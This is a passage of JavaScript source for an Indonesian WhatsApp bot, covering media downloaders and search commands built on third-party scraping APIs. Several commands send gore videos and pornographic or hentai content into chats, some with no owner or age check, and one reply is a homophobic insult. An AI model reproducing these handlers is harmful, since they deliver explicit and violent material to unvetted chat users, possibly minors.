if (!isCreator) return reply(mess.owner)
let { ytv } = require('./lib/scrape/y2mate')
if (!text) throw `Example : ${prefix + command} 1`
if (!m.quoted) return reply('Reply Pesan')
if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
let quality = args[1] ? args[1] : '360p'
let media = await downloadMp4(urls[text - 1], quality)
RezzHost.sendMessage(m.chat, { video: { url: media.urls }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${urls[text - 1]}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '360p'}` }, { quoted: kalgans })
}
break
case 'mediafire': {
if (args.length == 0) return reply(`Mana Link Nya ?`)
if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) throw `The link you provided is invalid`
reply(mess.search)
const { mediafireDl } = require('./lib/scrape/mediafire.js')
const baby1 = await mediafireDl(text)
if (baby1[0].size.split('MB')[0] >= 50) return reply('😅 Waduh Filenya Terlalu Besar...')
result4 = `乂 *MEDIAFIRE DOWNLOADER*

   ◦  *Name* : ${baby1[0].nama}
   ◦  *Size* : ${baby1[0].size}
   ◦  *Mime* : ${baby1[0].mime}
   ◦  *Link* : ${baby1[0].link}
   
${footer}`
RezzHost.sendMessage(m.chat, {
text: result4,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `M E D I A F I R E`,
body: '',
thumbnailUrl: ppuser,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
RezzHost.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : kalgans })
}
break
case 'git': case 'gitclone': {
if (!args[0]) return reply2(`Mana link nya?\nContoh :\n${prefix}${command} https://github.com/YukiShima4/tes`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return reply2(`Link invalid!!`)
reply(mess.search)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
let [, user, repo] = args[0].match(regex1) || []
repo = repo.replace(/.git$/, '')
let url = `https://api.github.com/repos/${user}/${repo}/zipball`
let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
RezzHost.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: kalgans }).catch((err) => reply('emror'))
}
break 
case 'get':
if (!isPrem && !isCreator) return reply2(`Fitur Khusus Premium silahkan beli paket premium di owner dengan cara ketik *.owner*`)
if (!/^https?:\/\//.test(text)) throw 'Awali *URL* dengan http:// atau https://';
const ajg = await fetch(text);
if (ajg.headers.get('content-length') > 100 * 1024 * 1024 * 1024) {
throw `Content-Length: ${ajg.headers.get('content-length')}`;
}
const contentType = ajg.headers.get('content-type');
if (contentType.startsWith('image/')) {
return RezzHost.sendMessage(m.chat, { image: { url: text } }, 'imageMessage', text, m);
}
if (contentType.startsWith('video/')) {
return RezzHost.sendMessage(m.chat, { video: { url: text } }, 'videoMessage', text, m);
}
if (contentType.startsWith('audio/')) {
return RezzHost.sendMessage(m.chat, { audio: { url: text } }, 'audioMessage', text, m);
}
let alak = await ajg.buffer();
try {
alak = util.format(JSON.parse(alak + ''));
} catch (e) {
alak = alak + '';
} finally {
reply2(alak.slice(0, 65536));
}
break          

// BATAS DOWNLOADMENU

// searchmenu
case 'gore': {
      let json = await chApi.gore()
      let caption = `	◦  *Title* : ${json.title}\n`
      caption += `	◦  *Tag* : ${json.tag}\n`
      caption += `	◦  *Upload* : ${json.upload}\n`
      caption += `	◦  *Author* : ${json.author}\n`
      caption += `	◦  *Vote* : ${json.vote}\n`
      caption += `	◦  *View* : ${json.view}\n`
      caption += `	◦  *Comment* : ${json.comment}\n\n`

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: global.idsal,
 newsletterName: 'Powered By RezzHost', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: RezzHost.decodeJid(RezzHost.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: caption
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `${footer2}`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: Styles(`*[ G O R E ]*\n`),
 subtitle: "dcdXdino",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ video: { url: json.video1 } }, { upload: RezzHost.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "quick_reply",
 "buttonParamsJson": `{\"display_text\":\"Next Gore\",\"id\":\".gore\"}`
 },
 ]
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'webtoon': {
if (!text) return reply(`${systemN} masukan query`)
await loading()
let web = await xfar.Webtoons(text)
let teks = `${gris}[ W E B T O O N - S E A R C H ]${gris}\n\n`
web.map((v, i) => {
teks += `• ${i+1} •\n${hiasan}*Title* : ${v.judul}\n`
teks += `${hiasan}*Like* : ${v.like}\n`
teks += `${hiasan}*Creator* : ${v.creator}\n`
teks += `${hiasan}*Genre* : ${v.genre}\n`
teks += `${hiasan}*Link* : ${v.url}\n\n───────────────\n\n`
}).join('\n\n')
teks += `${footer}`
RezzHost.sendMessage(m.chat, {
text: teks,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: tag,
body: '',
thumbnailUrl: web[0].thumbnail,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
}) 
}
break
case 'beasiswa': {
await loading()
let b = await fetchJson(`https://api.lolhuman.xyz/api/indbeasiswa?apikey=${apikey}`)
let txt = `*LIST BEASISWA*\n\n`
for (let bea of b.result) {
txt += `   ◦  *Title :* ${bea.title}\n`
txt += `   ◦  *Link :* ${bea.link}\n\n`
}
reply2(txt)
}
break
case 'drakor':{
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} the k2`)
reply(mess.search)
let anu = await fetchJson(`https://api.neoxr.my.id/api/drakor?q=${text}&apikey=${ApiNx}`)
let teks = `乂 *D R A K O R - S E A R C H*\n\n`
anu.data.map((v, i) => {
teks += `• ${i+1} •\n`
teks += `*Title* : ${v.title}\n`
teks += `*Episode* : ${v.episode}\n`
teks += `*Release* : ${v.release}\n`
teks += `*Genre* : ${v.genre}\n`
teks += `*Url* : ${v.url}\n\n───────────────\n\n`
}).join('\n\n')
reply2(teks)
}
break
case 'ytplaylist':{
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} Url`)
await loading()
let anu = await fetchJson(`https://api.neoxr.my.id/api/yt-playlist?url=${text}&apikey=${ApiNx}`)
let teks = `乂 *Y T  P L A Y L I S T- S E A R C H*\n\n\n`
anu.data.map((v, i) => {
teks += `*${v.title}*\n`
teks += `*Link* : ${v.url}\n\n───────────────\n\n`
}).join('\n\n')
teks += `${footer}`
reply2(teks) 
}
break
case 'music': {
if (!text) return reply(`Example: ${prefix + command} daylight`)
await loading()
const json = await fetchJson(`https://pnggilajacn.my.id/api/search/music?query=${text}`)
var rand = Math.floor(json.result.length * Math.random())
let tks = `M U S I C - S E A R C H

     ◦‎  Title : ${json.result[rand].title}
     ◦‎  Artist : ${json.result[rand].artist}
     ◦‎  Album : ${json.result[rand].album}
     ◦‎  Release : ${json.result[rand].release_date}
 
    
${footer}`
RezzHost.sendMessage(m.chat, {
text: tks,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `© 2024 | ${botname}`,
body: '',
thumbnailUrl: json.result[rand].thumbnail,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
RezzHost.sendMessage(m.chat, { audio: { url: json.result[rand].audio }, mimetype: 'audio/mp4' }, { quoted: kalgans })
}
break
case 'zerochan': {
if (!text) return reply(`Example: ${prefix + command} panda`)
reply(mess.search)
let old = new Date()
const json = await fetchJson(`https://api.xfarr.com/api/search/zerochan?apikey=${xfarApi}&query=${text}`)
for (let i = 0; i < 5; i++) {
var rand = Math.floor(json.result.result.length * Math.random())
RezzHost.sendMessage(m.chat, { image: { url: json.result.result[rand].image }, caption: `Title: ${json.result.result[rand].title}\n\n🍟 *Fetching* : ${((new Date - old) * 1)} ms` }, { quoted: kalgans })
await sleep(2000)
}
}
break
case 'randompornhub': {
if (!isCreator) return reply("You GAY !!!")
await loading()
let anu = await fetchJson(`https://api.ouzen.xyz/randomasupan/discord18?apikey=${ouzen}`)

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: global.idsal,
 newsletterName: 'Powered By RezzHost', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: RezzHost.decodeJid(RezzHost.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: ''
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: ''
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: Styles(`*Random 18*`),
 subtitle: "dcdXdino",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ video: { url: anu.result } }, { upload: RezzHost.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "quick_reply",
 "buttonParamsJson": `{\"display_text\":\"Next\",\"id\":\".randompornhub\"}`
 },
 ]
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'randompornhub2': {
if (!isCreator) return reply("You GAY !!!")
await loading()
let anu = await fetchJson(`https://api.koi.pics/api/anime/nekopoi?apikey=${koi}`)
RezzHost.sendMessage(from, { video: { url: anu.data }, caption: mess.done }, { quoted: kalgans })
}
break
case 'tiktoksearch2': case 'ttsearch2':{
if (!text) return reply(`Gunakan dengan cara ${prefix+command} *query*\n\n_Contoh_\n\n${prefix+command} jj epep`)
reply(mess.getdata)
try{
let anu = await chApi.ttsearch(text)
const capt = anu.title
RezzHost.sendMessage(m.chat, { video: { url: anu.no_watermark }, caption: `💬 Caption : ${capt}\n\n\n${footer}`}, {quoted: kalgans})
}catch (error) {
reply(`Sorry this video can't be download\n\nRequest failed with status code *400*`);
}
}
break
case 'tiktoksearch': case 'ttsearch':{
if (!text) return reply(`Gunakan dengan cara ${prefix+command} *query*\n\n_Contoh_\n\n${prefix+command} jj epep`)
let anu = await dann.search.tiktoks(text)
let old = new Date()
const capt = anu.title
const author = anu.author

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: global.idsal,
 newsletterName: 'Powered By RezzHost', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: RezzHost.decodeJid(RezzHost.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: Styles(`${hiasan}*Author* : ${author}\n${hiasan}*Caption* : ${capt}\n${hiasan}*Fetching* : ${((new Date - old) * 1)} ms`)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `${footer2}`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: Styles(`${gris}[ T I K T O K - S E A R C H ]${gris}`),
 subtitle: "dcdXdino",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ video: { url: anu.no_watermark } }, { upload: RezzHost.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "quick_reply",
 "buttonParamsJson": `{\"display_text\":\"Next\",\"id\":\".tiktoksearch ${text}\"}`
 },
 ]
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case '9apps':{
if (!isCreator) return reply(mess.owner)  
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} luky patcher`)
reply(mess.search)
let anu = await fetchJson(`https://api.alyachan.dev/api/apk?q=${text}&apikey=${alya}`)
let teks = `乂 *9 A P P S - S E A R C H*\n\n`
anu.data.map((v, i) => {
teks += `${i+1}.\n`
teks += `*Title* : ${v.title}\n`
teks += `*Category* : ${v.category}\n`
teks += `*Size* : ${v.size}\n`
teks += `*Downloaf* : ${v.download}\n`
teks += `*Rating* : ${v.rating}\n`
teks += `*Url* : ${v.url}\n\n───────────────\n\n`
}).join('\n\n')
RezzHost.sendMessage(m.chat, {
text: teks,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `乂 9 A P P S - S E A R C H`,
body: '',
thumbnailUrl: anu.data[0].icon,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break
case 'stackoverflow':{
if (!isCreator) return reply(mess.owner)  
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} Api`)
reply(mess.search)
let anu = await fetchJson(`https://api.xfarr.com/api/education/stackoverflow?apikey=${xfarApi}&query=${text}`)
let teks = `乂 *S T A C K O V E R F L O W - S E A R C H*\n\n`
anu.result.map((v, i) => {
teks += `${i+1}. ${v.userInfo.username}\n`
teks += `*Title* : ${v.title}\n`
teks += `*Id* : ${v.id}\n`
teks += `*Reputation* : ${v.userInfo.reputation}\n`
teks += `*Views* : ${v.views}\n`
teks += `*Answer* : ${v.answer}\n`
teks += `*Content* : ${v.content}\n`
teks += `*Time* : ${v.time}\n`
teks += `*Link* : ${v.url}\n\n───────────────\n\n`
}).join('\n\n')
teks += `${footer}`
RezzHost.sendMessage(m.chat, {
text: teks,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `乂 S T A C K O V E R F L O W`,
body: '',
thumbnailUrl: anu.result[0].image,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break
case 'gsmarena': {
if (!text) return reply(`Masukan Query \n\nContoh : \n${prefix + command} Poco x3 pro`)
if (!/https:\/\/carisinyal.com/.test(text)) {
let res = await spek(text)
let cap = res.map((v, i) => {
return `
_*${i + 1}. ${v.title}*_
❃ Harga: ${v.harga}
❃ Link: ${v.link}
`.trim()
}).join('\n\n')
reply(cap)
} else {
let { fitur, spek, img } = await speklengkap(text)
let cap1 = fitur.map(v => {
return v.desc
}).join('\n\n')
let cap2 = spek.map(v => {
return `
_*${v.name} :*_
${v.fitur}
`.trim()
}).join('\n\n')
RezzHost.sendMessage(m.chat, { image: { url: img }, fileName: 'fotohp.jpg', mimetype: 'image/jpeg', caption: `_*Fitur Unggulan:*_ \n\n${cap1}\n\n_*Spesifikasi Lengkap:*_\n\n${cap2}` }, { quoted: kalgans })
}
}
break
case 'urbandic': {
if (!text) return reply(`Example: ${prefix + command} Jawa`)
reply(mess.search)
let anu = await (await fetch(`https://api.lolhuman.xyz/api/urdict?apikey=${apikey}&query=${text}`)).json()
let txt = `*Found ${anu.result.length} Result*`
for (let x of anu.result) {
txt += `\n\n*definition :* ${x.definition}\n`
txt += `*word :* ${x.word}\n`
txt += `*example :* ${x.example}\n`
txt += `*written_on :* ${x.written_on}\n`
txt += `_${x.permalink}_\n`
txt += `───────────────────`
}
reply(txt)
}
break
case 'wallpaper': {
reply(mess.search)
let old = new Date()
RezzHost.sendMessage(m.chat, { image: { url: `https://pitucode.com/randomimage/wallhp?apikey=${pitu}` }, caption: `🍟 *Fetching* : ${((new Date - old) * 1)} ms` }, { quoted: kalgans })
}
break
case 'nhentaipdf': {
if (!text) return reply(`Example: ${prefix + command} Code`)
reply(mess.wait)
const json = await fetchJson(`https://api.arifzyn.tech/anime/nhentai/pdf?id=${text}&apikey=${arifyn}`)
RezzHost.sendMessage(m.chat, { document: { url: json.result.url }, mimetype: 'application/pdf', fileName : `${text}.pdf` }, { quoted: kalgans })
}
break
case 'nhentaiget': {
if (!text) return reply(`Example: ${prefix + command} Url`)
reply(mess.wait)
const json = await chApi.nhentaiget(text)
let teks = `乂  *N H E N T A I - G E T*\n\n`
teks += ` • *Id* : ${json.id}\n`
teks += ` • *Upload* : ${json.uploaded}\n`
teks += ` • *Title* : ${json.title}\n`
teks += ` • *Title Ja* : ${json.titleJa}\n`
for (let bahasa of json.languages) { 
teks += ` • *Languages* : ${bahasa}\n`
} 
for (let tag1 of json.tags) {
teks += ` • *Tags* : ${tag1}\n`
}
for (let url of json.pages) { 
teks += ` • *Link* : ${url}\n\n`
}
teks += global.footer
RezzHost.sendMessage(m.chat, {
text: teks,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `乂 N H E N T A I`,
body: '',
thumbnailUrl: 'https://telegra.ph/file/6c9d06c4341a7e43fcf5e.jpg',
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
json.pages.forEach(async (k) => {
await RezzHost.sendMessage(m.chat, { image: { url: k }}, { quoted: kalgans });
})
}
break
case 'nhentainew': {
reply(mess.search)
const json = await chApi.nhentainew()
let p = `N H E N T A I - S E A R C H\n\n`
json.map((v, i) => {
p += `*${i+1}. ID* : ${v.id}\n`
p += `◦ *Title* : ${v.title}\n`
p += `◦ *Link* : ${v.link}\n\n`
}).join('\n\n')
p += global.footer
RezzHost.sendMessage(m.chat, {
text: p,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `乂 N H E N T A I`,
body: '',
thumbnailUrl: json[0].thumbnail,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break
case 'nhentaisearch': {
if (!text) return reply(`Example: ${prefix + command} Anime`)
reply(mess.wait)
const json = await chApi.nhentaisearch(text)
let p = `N H E N T A I - S E A R C H\n\n`
json.map((v, i) => {
p += `*${i+1}. ID* : ${v.id}\n`
p += `◦ *Title* : ${v.title}\n`
p += `◦ *Link* : ${v.link}\n\n`
}).join('\n\n')
p += global.footer
RezzHost.sendMessage(m.chat, {
text: p,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `乂 N H E N T A I  S E A R C H`,
body: '',
thumbnailUrl: 'https://telegra.ph/file/6c9d06c4341a7e43fcf5e.jpg',
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break
case 'xhamsterdetail':{
if (!isCreator) return reply(mess.owner)  
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} 𝗷𝗮𝗽𝗮𝗻𝘀𝗲`)
reply(mess.search)
let anu = await fetchJson(`https://api.xfarr.com/api/download/xhamster?apikey=${xfarApi}&url=${text}`)
let teks = `乂 *X H A M S T E R - D E T A I L*\n\n`
teks += `*Title* : ${anu.result.title}\n`
teks += `*Duration* : ${anu.result.duration}\n`
anu.result.url.map((v, i) => {
teks += `${i+1}. ${anu.result.title}\n`
teks += `*Quality* : ${v.quality}\n`
teks += `*Ext* : ${v.ext}\n`
teks += `*Link* : ${v.download}\n\n───────────────\n\n`
}).join('\n\n')
teks += `${footer}`
reply(teks) 
}
break
case 'songfinder': {
if (!text) throw `Just type query what u need : *${prefix + command} drunk text*\n\nFor show info / download token : *${prefix + command} songfinder_token*`
	if (text.includes('==')) {
		try {
			let an = await fetchJson(`https://api.alyachan.dev/api/song-get?token=${text}&apikey=${alya}`)
			anu = an.data
			let txt = `*S O N G F I N D E R - G E T*\n\n`
			txt += `Duration : ${anu.duration}\n`
			txt += `Quality : ${anu.quality}\n`
			reply(txt)
			await RezzHost.sendMessage(m.chat, { audio: { url: anu.download_url }, caption: mess.done }, { quoted: kalgans })
		} catch (e) {
			console.log(e)
			throw 'invalid token / server down'
		}
	} else {
		try {
			let anu = await fetchJson(`https://api.alyachan.dev/api/song?q=${text}&apikey=${alya}`)
			an = anu.data
			let txt = `Found : *${text}*`
			for (var x of an) {
				txt += `\n\nId : ${x.id}\n`
				txt += `Title : ${x.title}\n`
				txt += `Duration : ${x.duration}\n`
				txt += `Author : ${x.author}\n`
				txt += `Token : ${x.token}\n`
				txt += `───────────────────`
			}
			reply(txt)
		} catch (e) {
			console.log(e)
			throw 'invalid query / server down.'
		}
	}
}
break
case 'dafontdl':{
if (!isCreator) return reply(mess.owner)  
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} bold`)
reply(mess.search)
let anu = await dafontDown(text)
let teks = `乂 *D A F O N T - D O W N L O A D*\n\n`
teks += `*Title* : ${anu[0].judul}\n`
teks += `*Style* : ${anu[0].style}\n\n`
teks += `${footer}`
RezzHost.sendMessage(m.chat, {
text: teks,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `乂 D A F O N T`,
body: '',
thumbnailUrl: ppuser,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
RezzHost.sendMessage(m.chat, { document: { url: anu[0].down }, fileName : `${anu[0].output}`, mimetype: 'zip' }, { quoted: m })
}
break
case 'dafontsearch':{
if (!isCreator) return reply(mess.owner)  
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} bold`)
reply(mess.search)
let anu = await dafontSearch(text)
let teks = `乂 *D A F O N T - S E A R C H*\n\n`
anu.map((v, i) => {
teks += `${i+1}. *Title* : ${v.judul}\n`
teks += `*Style* : ${v.style}\n`
teks += `*Total* : ${v.total}\n`
teks += `*Url* : ${v.link}\n\n───────────────\n\n`
}).join('\n\n')
teks += `${footer}`
reply(teks) 
}
break
case 'apksearch':{  
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} spotify`)
reply(mess.search)
let anu = await apkDl.search(text)
let teks = `乂 *A P K - S E A R C H*\n\n`
anu.map((v, i) => {
teks += `${i+1}.`
teks += `*Name* : ${v.name}\n`
teks += `*Id* : ${v.id}\n\n───────────────\n\n`
}).join('\n\n')
teks += `${footer}`
reply(teks) 
}
break
case 'dafont':{
if (!isCreator) return reply(mess.owner)  
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} bold`)
reply(mess.search)
let anu = await fetchJson(`https://api.xfarr.com/api/search/dafont?apikey=${xfarApi}&query=${text}`)
let teks = `乂 *D A F O N T - S E A R C H*\n\n`
anu.result.map((v, i) => {
teks += `${i+1}. *Author* : ${v.author}\n`
teks += `*Title* : ${v.title}\n`
teks += `*Statistic* : ${v.statistic}\n`
teks += `*Preview* : ${v.preview}\n`
teks += `*Filename* : ${v.filename}\n`
teks += `*Date* : ${v.date}\n`
teks += `*Note* : ${v.note}\n`
teks += `*Url* : ${v.url_download}\n\n───────────────\n\n`
}).join('\n\n')
teks += `${footer}`
reply(teks) 
}
break
case 'apkmirorsearch':{
if (!isCreator) return reply(mess.owner)  
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} spotify`)
reply(mess.search)
let anu = await fetchJson(`https://pitucode.com/webzone/apkmirror?query=${text}&apikey=${pitu}`)
let teks = `乂 *M I R R O R - S E A R C H*\n\n`
anu.result.map((v, i) => {
teks += `${i+1}. *Title* : ${v.judul}\n`
teks += `*Dev* : ${v.dev}\n`
teks += `*Link* : ${v.link}\n\n───────────────\n\n`
}).join('\n\n')
teks += `${footer}`
reply(teks) 
}
break
case 'jobstreet':{
if (!isCreator) return reply(mess.owner)  
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} it`)
reply(mess.search)
let anu = await fetchJson(`https://api.xfarr.com/api/search/jobstreet?apikey=${xfarApi}&query=${text}`)
let teks = `乂 *J O B - S E A R C H*\n\n`
anu.result.map((v, i) => {
teks += `${i+1}. *Job* : ${v.job}\n`
teks += `*Perusahaan* : ${v.perusahaan}\n`
teks += `*Daerah* : ${v.daerah}\n`
teks += `*Upload* : ${v.upload}\n`
teks += `*Link* : ${v.url_detail}\n\n───────────────\n\n`
}).join('\n\n')
teks += `${footer}`
reply(teks) 
}
break
case 'trendgoogle':{
if (!isCreator) return reply(mess.owner)  
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} Indonesia`)
reply(mess.search)
let anu = await fetchJson(`https://api.xfarr.com/api/information/trendgoogle?apikey=${xfarApi}&country=${text}`)
let teks = `乂 *T R E N D  G O G L E - S E A R C H*\n\n`
anu.result.map((v, i) => {
teks += `${i+1}. *Title* : ${v.title}\n`
teks += `*Link* : ${v.url}\n\n───────────────\n\n`
}).join('\n\n')
teks += `${footer}`
reply(teks) 
}
break
case 'trendyt':{
if (!isCreator) return reply(mess.owner)  
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} Indonesia`)
reply(mess.search)
let anu = await fetchJson(`https://api.xfarr.com/api/information/trendyt?apikey=${xfarApi}&country=${text}`)
let teks = `乂 *T R E N D  Y T - S E A R C H*\n\n`
anu.result.map((v, i) => {
teks += `${i+1}. *Title* : ${v.title}\n`
teks += `*Upload* : ${v.upload}\n`
teks += `*UploadDate* : ${v.upload_date}\n`
teks += `*Link* : ${v.url}\n\n───────────────\n\n`
}).join('\n\n')
teks += `${footer}`
reply(teks) 
}
break
case 'trendtwit':{
if (!isCreator) return reply(mess.owner)  
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} Indonesia`)
reply(mess.search)
let anu = await fetchJson(`https://api.xfarr.com/api/information/trendtweet?apikey=${xfarApi}&country=${text}`)
let teks = `乂 *T R E N D T W I T - S E A R C H*\n\n`
anu.result.map((v, i) => {
teks += `${i+1}. *Hastag* : ${v.hastag}\n`
teks += `*Trending* : ${v.trending_number}\n`
teks += `*TweetCount* : ${v.tweet_count}\n`
teks += `*Link* : ${v.url}\n\n───────────────\n\n`
}).join('\n\n')
teks += `${footer}`
reply(teks) 
}
break
case 'domainsearch':{
if (!isCreator) return reply(mess.owner)  
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} kayy.me`)
reply(mess.search)
let anu = await fetchJson(`https://api.xfarr.com/api/search/domain?apikey=${xfarApi}&query=${text}`)
let teks = `乂 *D O M A I N - S E A R C H*\n\n`
anu.result.map((v, i) => {
teks += `${i+1}. *Name* : ${v.name}\n`
teks += `*Used* : ${v.used}\n`
for (let x of Object.keys(v.data)) {
teks += `*${x}*\n`
teks += v.data[x]
for (let y of Object.keys(v.data[x])) {
teks += `${y} : ${v.data[x][y]}`
teks += `\n\n───────────────\n\n`
}
}
}).join('\n\n')
teks += `${footer}`
reply(teks) 
}
break
case 'bukalapak':{
if (!isCreator) return reply(mess.owner)  
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} Vps`)
reply(mess.search)
let anu = await dann.search.BukaLapak(text)
let teks = `乂 *B U K A L A P A K - S E A R C H*\n\n`
anu.map((v, i) => {
teks += `${i+1}. `
teks += `*Produk* : ${v.title}\n`
teks += `*Rating* : ${v.rating}\n`
teks += `*Sold* : ${v.terjual}\n`
teks += `*Price* : ${v.harga}\n`
teks += `*Location* : ${v.store.lokasi}\n`
teks += `*NameLocation* : ${v.store.nama}\n`
teks += `*Link* : ${v.store.link}\n\n───────────────\n\n`
}).join('\n\n')
teks += `${footer}`
RezzHost.sendMessage(m.chat, {
text: teks,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `© 2024 | B U K A L A P A K`,
body: '',
thumbnailUrl: "https://telegra.ph/file/03dbd32dae736bca90780.jpg",
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break
case 'nekopoi': {
if (!text) throw `For searching in kucingpoi : *${prefix + command} isekai harem*\n\nFor show info / download link : *${prefix + command} nekopoi_url*`
let anu = await fetchJson(`https://api.lolhuman.xyz/api/nekopoi?apikey=${apikey}&url=${text}`)
anu = anu.result
let txt = `*${anu.title}*\n\n`
txt += `_${anu.sinopsis}_\n\n`
txt += `*Producers :* ${anu.producers}\n`
txt += `*Duration :* ${anu.duration}\n`
txt += `*Genre :* ${anu.genre.toString().replaceAll(',',', ')}\n\n`
txt += `*Download Link :*`
for (let x of Object.keys(anu.link)) {
txt += `\n\n*[ ${x} ]*\n`
for (let y of Object.keys(anu.link[x])) {
txt += `${y} : ${anu.link[x][y]}\n`
}
txt += `───────────────────`
}
RezzHost.sendMessage(m.chat, { image: { url: anu.thumbnail }, caption: txt }, { quoted : m })
}
break
case 'nekopoisearch': {
if (!text) return reply(`Example: ${prefix + command} milf`)
reply(mess.search)
let anu = await fetchJson(`https://api.lolhuman.xyz/api/nekopoisearch?apikey=${apikey}&query=${text}`)
anu = anu.result
let txt = `Found : *${text}*`
for (let x of anu) {
txt += `\n\n*Title :* ${x.title}\n`
